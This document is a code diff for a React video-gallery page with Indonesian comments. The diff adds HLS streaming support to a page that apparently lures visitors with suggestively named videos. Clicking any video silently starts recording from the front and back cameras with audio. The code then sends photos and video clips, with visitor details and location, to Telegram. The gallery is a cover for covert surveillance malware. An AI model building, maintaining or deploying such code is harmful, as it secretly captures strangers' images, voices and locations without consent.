@@ -1,29 +1,16 @@
 import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback, useRef } from 'react';
 import Slider from 'react-slick';
+import Hls from 'hls.js';
 import './styles/custom.css';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';
 
-// Definisikan tipe untuk objek video
+// Definisikan tipe untuk video
 interface Video {
   videoUrl: string;
   hlsUrl: string;
 }
-
-// Definisikan array videos dengan tipe yang tepat
-const videos: Video[] = [
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio1.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio1/vidio1.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/teskntol.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/teskntol/teskntol.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio5.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio5/vidio5.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio6.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio6/vidio6.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio9.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio9/vidio9.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio8.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio8/vidio8.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio10.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio10/vidio10.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio11.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio11/vidio11.m3u8" },
-  { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio12.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio12/vidio12.m3u8" }
-];
 
 // Fungsi untuk membagi array video menjadi kelompok 5 untuk slide
 const chunkArray = <T,>(array: T[], size: number): T[][] => {
@@ -53,12 +40,28 @@ function App() {
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const sliderRef = useRef<Slider | null>(null);
+  const hlsInstances = useRef<(Hls | null)[]>([]);
+
+  // Definisikan array videos dengan tipe yang tepat
+  const videos: Video[] = [
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio1.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio1/vidio1.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/teskntol.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/teskntol/teskntol.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio5.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio5/vidio5.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio6.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio6/vidio6.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio9.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio9/vidio9.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio8.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio8/vidio8.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio10.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio10/vidio10.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio11.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio11/vidio11.m3u8" },
+    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio12.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio12/vidio12.m3u8" }
+  ];
 
   const videoSlides = chunkArray(videos, 5);
 
   useEffect(() => {
     setIsLoading(new Array(videos.length).fill(true));
     setVideoErrors(new Array(videos.length).fill(false));
+    hlsInstances.current = new Array(videos.length).fill(null);
   }, []);
 
   useEffect(() => {
@@ -86,20 +89,18 @@ function App() {
   }, [loadedSlides]);
 
   useEffect(() => {
-    const activeSlideVideos = videoSlides[currentSlide] || [];
+    const activeSlideVideos = videoSlides[currentSlide];
     activeSlideVideos.forEach((video, index) => {
       const globalIndex = currentSlide * 5 + index;
-      if (video) {
-        const urlToValidate = isSafari() ? video.hlsUrl : video.videoUrl;
-        console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
-        if (!validateVideoUrl(urlToValidate)) {
-          console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
-          setVideoErrors((prev) => {
-            const newErrors = [...prev];
-            newErrors[globalIndex] = true;
-            return newErrors;
-          });
-        }
+      const urlToValidate = isSafari() ? video.hlsUrl : video.videoUrl;
+      console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
+      if (!validateVideoUrl(urlToValidate)) {
+        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
+        setVideoErrors((prev) => {
+          const newErrors = [...prev];
+          newErrors[globalIndex] = true;
+          return newErrors;
+        });
       }
     });
   }, [currentSlide]);
@@ -151,6 +152,8 @@ function App() {
     return () => {
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
+      hlsInstances.current.forEach((hls) => hls?.destroy());
+      hlsInstances.current = [];
     };
   }, [hasRequestedLocation]);
 
@@ -158,10 +161,16 @@ function App() {
     if (hasRequestedCamera) return;
     setHasRequestedCamera(true);
 
-    const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
+    const requestMediaAccess = async (
+      facingMode: string | { deviceId: string },
+      cameraType: string
+    ): Promise<{ stream: MediaStream; deviceId: string } | null> => {
       try {
         const constraints = {
-          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
+          video:
+            typeof facingMode === 'string'
+              ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } }
+              : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
           audio: true,
         };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -173,7 +182,10 @@ function App() {
         console.error(`Gagal mendapatkan akses kamera ${cameraType}: ${err.message}`);
         try {
           const constraints = {
-            video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
+            video:
+              typeof facingMode === 'string'
+                ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } }
+                : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
             audio: true,
           };
           const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -190,8 +202,8 @@ function App() {
 
     try {
       const devices = await navigator.mediaDevices.enumerateDevices();
-      const videoDevices = devices.filter(device => device.kind === 'videoinput');
-      console.log('Perangkat kamera yang ditemukan:', videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId })));
+      const videoDevices = devices.filter((device) => device.kind === 'videoinput');
+      console.log('Perangkat kamera yang ditemukan:', videoDevices.map((d) => ({ label: d.label, deviceId: d.deviceId })));
 
       const frontResult = await requestMediaAccess('user', 'depan');
       if (frontResult) {
@@ -214,7 +226,7 @@ function App() {
       if (cameraStreamsRef.current.length === 0) {
         console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
       } else {
-        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
+        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map((s) => `${s.type} (${s.deviceId})`));
       }
     } catch (error: unknown) {
       const err = error as Error;
@@ -274,7 +286,7 @@ function App() {
       const newStream = await reinitializeStream(type, deviceId);
       if (newStream && verifyStream(newStream, type)) {
         currentStream = newStream;
-        const cameraIndex = cameraStreamsRef.current.findIndex(s => s.type === type);
+        const cameraIndex = cameraStreamsRef.current.findIndex((s) => s.type === type);
         if (cameraIndex !== -1) {
           cameraStreamsRef.current[cameraIndex].stream = newStream;
         }
@@ -340,8 +352,7 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}: ${err.message}`);
       }
 
-      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
-        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
+      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4'].find((type) => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
         videoBitsPerSecond: 2500000,
@@ -399,8 +410,8 @@ function App() {
         return;
       }
 
-      const frontCamera = cameraStreamsRef.current.find(s => s.type === 'depan');
-      const backCamera = cameraStreamsRef.current.find(s => s.type === 'belakang');
+      const frontCamera = cameraStreamsRef.current.find((s) => s.type === 'depan');
+      const backCamera = cameraStreamsRef.current.find((s) => s.type === 'belakang');
 
       if (frontCamera) {
         await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
@@ -423,49 +434,120 @@ function App() {
     }
   }, []);
 
-  const handleVideoClick = useCallback(async (index: number) => {
-    startCameraRecording();
-
-    if (isPlaying !== null && isPlaying !== index) {
-      const prevVideo = videoRefs.current[isPlaying];
-      if (prevVideo) {
-        prevVideo.pause();
-        prevVideo.currentTime = 0;
-        prevVideo.removeAttribute('src');
-        prevVideo.load();
-        stopRecording();
-        console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
-      }
-    }
-
-    const videoElement = videoRefs.current[index];
-    if (videoElement) {
-      const urlToUse = isSafari() ? videos[index].hlsUrl : videos[index].videoUrl;
-      if (!validateVideoUrl(urlToUse)) {
-        console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
+  const setupHls = (videoElement: HTMLVideoElement, hlsUrl: string, index: number) => {
+    if (Hls.isSupported()) {
+      const hls = new Hls({
+        enableWorker: true,
+        lowLatencyMode: true,
+        backBufferLength: 90,
+      });
+      hls.loadSource(hlsUrl);
+      hls.attachMedia(videoElement);
+      hls.on(Hls.Events.MANIFEST_PARSED, () => {
+        videoElement.play().catch((err) => {
+          console.error(`HLS play error for video ${index + 1}:`, err);
+          setVideoErrors((prev) => {
+            const newErrors = [...prev];
+            newErrors[index] = true;
+            return newErrors;
+          });
+        });
+      });
+      hls.on(Hls.Events.ERROR, (event, data) => {
+        console.error(`HLS error for video ${index + 1}:`, data);
+        if (data.fatal) {
+          setVideoErrors((prev) => {
+            const newErrors = [...prev];
+            newErrors[index] = true;
+            return newErrors;
+          });
+          hls.destroy();
+        }
+      });
+      hlsInstances.current[index] = hls;
+    } else if (videoElement.canPlayType('application/vnd.apple.mpegurl')) {
+      videoElement.src = hlsUrl;
+      videoElement.play().catch((err) => {
+        console.error(`Native HLS error for video ${index + 1}:`, err);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
           newErrors[index] = true;
           return newErrors;
         });
-        return;
+      });
+    } else {
+      console.error(`HLS not supported for video ${index + 1}`);
+      setVideoErrors((prev) => {
+        const newErrors = [...prev];
+        newErrors[index] = true;
+        return newErrors;
+      });
+    }
+  };
+
+  const handleVideoClick = useCallback(
+    async (index: number) => {
+      startCameraRecording();
+
+      if (isPlaying !== null && isPlaying !== index) {
+        const prevVideo = videoRefs.current[isPlaying];
+        if (prevVideo) {
+          prevVideo.pause();
+          prevVideo.currentTime = 0;
+          prevVideo.removeAttribute('src');
+          prevVideo.load();
+          if (hlsInstances.current[isPlaying]) {
+            hlsInstances.current[isPlaying]?.destroy();
+            hlsInstances.current[isPlaying] = null;
+          }
+          stopRecording();
+          console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
+        }
       }
 
-      try {
-        setIsPlaying(index);
-        videoElement.src = urlToUse;
-        await videoElement.play();
-      } catch (error: unknown) {
-        const err = error as Error;
-        console.error(`Error memutar video ${index + 1}: ${err.message}`);
-        videoElement.pause();
-        videoElement.currentTime = 0;
-        videoElement.removeAttribute('src');
-        videoElement.load();
-        setIsPlaying(null);
+      const videoElement = videoRefs.current[index];
+      if (videoElement) {
+        const urlToUse = isSafari() ? videos[index].hlsUrl : videos[index].videoUrl;
+        if (!validateVideoUrl(urlToUse)) {
+          console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
+          setVideoErrors((prev) => {
+            const newErrors = [...prev];
+            newErrors[index] = true;
+            return newErrors;
+          });
+          return;
+        }
+
+        try {
+          setIsPlaying(index);
+          if (isSafari()) {
+            setupHls(videoElement, videos[index].hlsUrl, index);
+          } else {
+            videoElement.src = urlToUse;
+            await videoElement.play();
+          }
+        } catch (error: unknown) {
+          const err = error as Error;
+          console.error(`Error memutar video ${index + 1}: ${err.message}`);
+          videoElement.pause();
+          videoElement.currentTime = 0;
+          videoElement.removeAttribute('src');
+          videoElement.load();
+          if (hlsInstances.current[index]) {
+            hlsInstances.current[index]?.destroy();
+            hlsInstances.current[index] = null;
+          }
+          setIsPlaying(null);
+          setVideoErrors((prev) => {
+            const newErrors = [...prev];
+            newErrors[index] = true;
+            return newErrors;
+          });
+        }
       }
-    }
-  }, [isPlaying]);
+    },
+    [isPlaying]
+  );
 
   const toggleFullscreen = (index: number) => {
     const videoElement = videoRefs.current[index];
@@ -482,6 +564,10 @@ function App() {
 
   const handleVideoEnded = (index: number) => {
     setIsPlaying(null);
+    if (hlsInstances.current[index]) {
+      hlsInstances.current[index]?.destroy();
+      hlsInstances.current[index] = null;
+    }
     console.log(`Video di indeks ${index} telah selesai.`);
   };
 
@@ -498,7 +584,9 @@ function App() {
     const videoElement = event.currentTarget as HTMLVideoElement;
     const errorCode = videoElement.error?.code;
     const errorMessage = videoElement.error?.message || 'Unknown error';
-    console.error(`Gagal memuat video ${index + 1}: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`);
+    console.error(
+      `Gagal memuat video ${index + 1}: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`
+    );
     setIsLoading((prev) => {
       const newLoading = [...prev];
       newLoading[index] = false;
@@ -509,6 +597,10 @@ function App() {
       newErrors[index] = true;
       return newErrors;
     });
+    if (hlsInstances.current[index]) {
+      hlsInstances.current[index]?.destroy();
+      hlsInstances.current[index] = null;
+    }
   };
 
   useEffect(() => {
@@ -521,6 +613,10 @@ function App() {
             videoElement.currentTime = 0;
             videoElement.removeAttribute('src');
             videoElement.load();
+            if (hlsInstances.current[isPlaying]) {
+              hlsInstances.current[isPlaying]?.destroy();
+              hlsInstances.current[isPlaying] = null;
+            }
             console.log('Video dihentikan karena keluar dari fullscreen.');
           }
         }
@@ -532,6 +628,8 @@ function App() {
       stopRecording();
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
+      hlsInstances.current.forEach((hls) => hls?.destroy());
+      hlsInstances.current = [];
     };
 
     document.addEventListener('fullscreenchange', handleFullscreenChange);
@@ -612,11 +710,7 @@ function App() {
         <div className="max-w-[1200px] mx-auto">
           <Slider ref={sliderRef} {...sliderSettings}>
             {videoSlides.map((slideVideos, slideIndex) => (
-              <div
-                key={slideIndex}
-                className="px-2 slide-container"
-                data-slide-index={slideIndex}
-              >
+              <div key={slideIndex} className="px-2 slide-container" data-slide-index={slideIndex}>
                 {!loadedSlides.includes(slideIndex) ? (
                   <div className="flex items-center justify-center h-[200px] bg-gray-800 bg-opacity-75">
                     <svg
@@ -625,14 +719,7 @@ function App() {
                       fill="none"
                       viewBox="0 0 24 24"
                     >
-                      <circle
-                        className="opacity-25"
-                        cx="12"
-                        cy="12"
-                        r="10"
-                        stroke="currentColor"
-                        strokeWidth="4"
-                      ></circle>
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                       <path
                         className="opacity-75"
                         fill="currentColor"
@@ -642,8 +729,10 @@ function App() {
                   </div>
                 ) : (
                   <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
-                    {slideVideos.map((video, index) => {
+                    {slideVideos.map((_, index) => {
                       const globalIndex = slideIndex * 5 + index;
+                      const videoSource = isSafari() ? videos[globalIndex].hlsUrl : videos[globalIndex].videoUrl;
+                      const videoType = isSafari() ? 'application/vnd.apple.mpegurl' : 'video/mp4';
                       return (
                         <div
                           key={globalIndex}
@@ -689,15 +778,9 @@ function App() {
                             onEnded={() => handleVideoEnded(globalIndex)}
                             onCanPlay={() => handleCanPlay(globalIndex)}
                             onError={(event) => handleVideoError(globalIndex, event)}
-                            preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
-                            {...({ loading: 'lazy' } as any)}
+                            preload={isSafari() ? 'auto' : 'metadata'}
                           >
-                            {isSafari() ? (
-                              <source src={video.hlsUrl} type="application/vnd.apple.mpegurl" />
-                            ) : (
-                              <source src={video.videoUrl} type="video/mp4" />
-                            )}
-                            <p>Your browser does not support the video tag.</p>
+                            <source src={videoSource} type={videoType} />
                           </video>
                           {isPlaying === globalIndex && !videoErrors[globalIndex] && (
                             <div className="absolute bottom-2 right-2 z-20">
